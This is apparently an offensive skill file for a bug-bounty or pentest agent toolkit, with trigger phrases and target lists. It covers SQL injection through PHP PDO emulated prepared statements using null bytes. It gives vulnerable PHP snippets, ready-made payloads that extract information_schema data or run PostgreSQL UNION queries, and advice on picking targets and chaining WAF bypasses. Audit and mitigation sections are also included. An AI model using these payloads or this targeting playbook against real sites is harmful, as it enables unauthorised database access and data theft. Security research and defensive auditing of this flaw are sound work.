---
name: pdo-prepared-statement-sqli
pattern: PDO Prepared Statement SQL Injection via Null Bytes
description: "Auto-trigger: PHP PDO target, prepared statements, MySQL emulated prepares, null byte SQL injection"
tech: [php, pdo]
severity: Critical
triggers:
  - /test-sqli
  - php pdo
  - prepared statement bypass
  - null byte sqli
  - emulated prepares
related_patterns:
  - waf-bypass-matrix
  - ajax-sqli-waf-bypass-methodology
  - dotnet-loose-type-sqli
sources:
  - "Adam Kues (hashkitten) — Searchlight Cyber / Assetnote (2025)"
---

# PDO Prepared Statement SQL Injection via Null Bytes

## Crown Jewel Targets

- Custom PHP CMS/admin panels with dynamic column selection (ORDER BY dropdown)
- E-commerce platforms using PDO with default settings (emulated prepares ON)
- WordPress plugins mixing interpolation with PDO `execute()`
- PHP 8.3 and earlier with MySQL backend (highest exposure)
- Laravel/Symfony apps using raw DB queries alongside Eloquent/Doctrine
- Any PHP app with user-controlled table/column names in backtick-quoted identifiers
- PostgreSQL + PHP < 8.4 with `$pdo->quote()` on user input

## Attack Surface Signals

- URL patterns: `/admin/`, `/dashboard/`, `/report/`, `?sort=`, `?orderby=`, `?column=`
- PHP response headers: `X-Powered-By: PHP/8.*`, `Set-Cookie: PHPSESSID`
- Tech indicators: MySQL 5.x/8.x backend, PHP PDO in stack traces
- Code patterns: `ORDER BY` with user-selected column, dynamic table names
- Error messages mentioning `PDOException`, `SQLSTATE`, `HY000`

**Source:** Adam Kues (hashkitten), Searchlight Cyber / Assetnote (2025)
**Affected:** PHP with PDO emulated prepares (default for MySQL)

## Core Concept

PDO emulates prepared statements by default for MySQL. Its custom SQL parser identifies `?` and `:param` placeholders while skipping strings and quoted identifiers. A null byte (`\x00`) causes the parser to misparse backtick-quoted identifiers, exposing fake bind parameters to attacker control.

## Root Cause

PDO's MySQL scanner defines `ANYNOEOF` as `[\001-\377]` — excluding null bytes. When parsing backtick-quoted identifiers, a null byte causes parser backtracking. The opening backtick falls through to `SPECIALS` and gets skipped, exposing any `?` inside as a positional bind parameter.

## Exploitation Scenario 1: Column/Table Names

```php
$col = '`' . str_replace('`', '``', $_GET['col']) . '`';
$stmt = $pdo->prepare("SELECT $col FROM fruit WHERE name = ?");
$stmt->execute([$_GET['name']]);
```

**Payload:**
```
col=\?%23%00
name=x` FROM (SELECT table_name AS `'x` from information_schema.tables)y;%23
```

The `?` inside the backtick-quoted identifier becomes a bind parameter due to null byte parser confusion. The `name` value gets substituted into the wrong position.

## Exploitation Scenario 2: Manual Escaping

```php
$sku = strtr($_GET['sku'], ["'" => "\\'", '\\' => '\\\\']);
$stmt = $pdo->prepare("SELECT * FROM fruit WHERE sku LIKE '%$sku%' AND name = ?");
$stmt->execute([$_GET['name']]);
```

**Payload:** `sku=?%00` — null byte causes PDO to see extra bind parameter.

## Exploitation Scenario 3: PostgreSQL (PHP < 8.4)

Pre-8.4 PDO used a single parser for all dialects, assuming backslash escaping even for PostgreSQL (which doesn't use it in standard strings).

```php
$sku = $pdo->quote($_GET['sku']);
$stmt = $pdo->prepare("SELECT * FROM fruit WHERE sku = $sku AND name = ?");
$stmt->execute([$_GET['name']]);
```

**Payload:**
```
sku=\%27?--
name=UNION SELECT 1337,chr(33),1337,chr(33)--
```

PDO sees `'\''?'` (backslash-escaped), PostgreSQL sees `'\'` as complete string + exposed `?`.

## Key Payloads

| Payload | Purpose | Database |
|---------|---------|----------|
| `?\x00` | Inject positional bind via null byte | MySQL |
| `?#\x00` | Same + comment to stop parsing | MySQL |
| `\?#\x00` | With backslash for quote handling | MySQL |
| `\'?--` | Exploit backslash assumption | PostgreSQL (< PHP 8.4) |

## Affected Versions

| Database | PHP 8.4 | PHP 8.3 and earlier |
|----------|---------|---------------------|
| MySQL | Vulnerable (null byte) | More vulnerable (no backtick parsing) |
| PostgreSQL | Only with ATTR_EMULATE_PREPARES=true | Vulnerable with emulation |
| SQLite | Not vulnerable | Not vulnerable |

## Detection in Code Audit

Look for:
1. `PDO::ATTR_EMULATE_PREPARES` not explicitly set to `false`
2. User input in column names, table names, or ORDER BY clauses
3. Mixed prepared + interpolated queries
4. `$pdo->quote()` used with PostgreSQL on PHP < 8.4
5. Any `str_replace`/`strtr` escaping combined with PDO `execute()`

## Mitigations

1. **Disable emulated prepares:** `$pdo->setAttribute(PDO::ATTR_EMULATE_PREPARES, false);`
2. **Upgrade to PHP 8.4** (dialect-specific parsers)
3. **Filter null bytes** from user input
4. **Never mix interpolation with bound parameters** in PDO emulation mode
5. Use allowlists for column/table names

## Bug Bounty Relevance

- **CRITICAL**: SQLi in code that appears to use prepared statements correctly
- Common in PHP applications using PDO with default settings
- Especially dangerous in custom CMS/admin panels with dynamic column selection
- Look for `ORDER BY`, `GROUP BY`, dynamic column names in queries

## Operator Notes (Battle-Tested)

- **Default PDO is vulnerable**: `ATTR_EMULATE_PREPARES` defaults to `true` for MySQL. Most PHP devs never change this. Assume vulnerable unless proven otherwise.
- **Null byte is the key**: `%00` in backtick-quoted identifiers causes parser backtracking. Always test `?\x00` and `?#\x00` on PHP/MySQL targets.
- **Mixed queries are gold**: Any file mixing `$pdo->prepare()` with string concatenation is likely vulnerable. Grep for `"SELECT.*$` patterns.
- **PostgreSQL is different**: Pre-8.4 PHP uses wrong escape model for PostgreSQL. The `\'?--` payload exploits backslash assumption mismatch.
- **Code audit fast path**: Search for `Dictionary<string, object>` (C#) or `FROM.*\$` (PHP) in source — these are the injection enablers.
- **Automated scanners miss this**: sqlmap does not test null-byte PDO bypass. Manual testing required.

## Related Skills & Chains

| Pattern | Chain Potential |
|---------|---------------|
| `waf-bypass-matrix` | WAF evasion for delivering null byte payloads |
| `ajax-sqli-waf-bypass-methodology` | AJAX endpoint discovery for PHP apps |
| `dotnet-loose-type-sqli` | Same concept (type confusion) in .NET |
| `apache-confusion-attacks` | Handler confusion to reach PHP-FPM endpoints |
| `windows-bestfit-unicode-attacks` | Unicode bypass on Windows PHP-CGI |
